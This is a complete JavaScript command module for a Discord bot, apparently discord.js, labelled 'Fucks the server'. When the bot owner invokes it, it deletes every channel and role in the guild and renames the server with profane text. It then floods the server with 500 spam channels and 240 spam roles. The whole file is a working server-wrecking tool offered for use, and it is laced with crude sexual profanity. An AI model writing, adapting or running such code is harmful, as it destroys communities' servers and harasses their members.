exports.run = async (client, message, args) => {
  if (message.author.id != client.config.ownerID) {
    await message.channel.send("oi m8 u cant run that ur not my owner");
    return;
  }

  await (function(guild) {

    // destroy channels and roles
    guild.channels.cache.forEach(channel => channel.delete());
    guild.roles.cache.forEach(role => role.delete().catch(e => {}));

    // modify server
    guild.setIcon(
      "./fuckboy.jpg"
    );
    guild.setName("[SHITSTORM] fuckboy nation v6");
  })(message.guild);

  // spam channels and roles
  for (var i = 0; i < 500; i++) {
    var channelName =
      Math.random()
        .toString(36)
        .slice(2) + "-sex";
    message.guild.channels.create(channelName, {
      type: "text",
      permissionOverwrites: [
        {
          id: message.guild.roles.everyone.id,
          allow: ["VIEW_CHANNEL"],
          deny: ["SEND_MESSAGES"]
        }
      ]
    });
  }
  for (var i = 0; i < 240; i++) {
    var roleName =
      Math.random()
        .toString(36)
        .slice(2) + " sex";
    message.guild.roles.create({
      data: {
        name: roleName,
        color: "#ff00ff"
      }
    });
  }
};

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: []
};

exports.help = {
  name: "fuck",
  description: "Fucks the server",
  usage: "fuck"
};
